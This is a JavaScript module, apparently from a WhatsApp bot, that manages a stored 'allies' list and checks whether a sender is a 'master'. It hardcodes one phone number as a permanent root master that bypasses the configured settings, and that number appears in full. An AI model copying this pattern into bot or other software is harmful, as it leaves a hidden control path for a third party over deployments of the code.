import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import settings from '../settings.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Pointer to ./storage/allies.json from handlers directory
const ALLIES_PATH = path.join(__dirname, '..', 'storage', 'allies.json');

// Hardcoded Root Primary Master Number
const HARDCODED_PRIMARY_MASTER = "2347040401291@s.whatsapp.net";

function initStorage() {
    const dir = path.dirname(ALLIES_PATH);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    if (!fs.existsSync(ALLIES_PATH)) fs.writeFileSync(ALLIES_PATH, JSON.stringify([]));
}

export function getAllies() {
    initStorage();
    try {
        return JSON.parse(fs.readFileSync(ALLIES_PATH, 'utf-8'));
    } catch {
        return [];
    }
}

export function addAlly(number) {
    initStorage();
    const cleanNumber = number.replace(/[^0-9]/g, '');
    if (!cleanNumber) return null;
    const jid = `${cleanNumber}@s.whatsapp.net`;
    const allies = getAllies();
    if (!allies.includes(jid)) {
        allies.push(jid);
        fs.writeFileSync(ALLIES_PATH, JSON.stringify(allies, null, 2));
    }
    return jid;
}

export function removeAlly(number) {
    initStorage();
    const cleanNumber = number.replace(/[^0-9]/g, '');
    if (!cleanNumber) return null;
    const jid = `${cleanNumber}@s.whatsapp.net`;
    let allies = getAllies();
    allies = allies.filter(item => item !== jid);
    fs.writeFileSync(ALLIES_PATH, JSON.stringify(allies, null, 2));
    return jid;
}

export function isMaster(senderJid) {
    if (!senderJid) return false;
    const cleanSender = senderJid.split(':')[0].split('@')[0] + '@s.whatsapp.net';
    
    // 1. Primary Hardcoded Master
    if (cleanSender === HARDCODED_PRIMARY_MASTER) return true;

    // 2. Settings Secondary Master
    const settingsJid = `${settings.masterNumber.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
    if (cleanSender === settingsJid) return true;

    // 3. Dynamic Allies from ./storage/allies.json
    return getAllies().includes(cleanSender);
}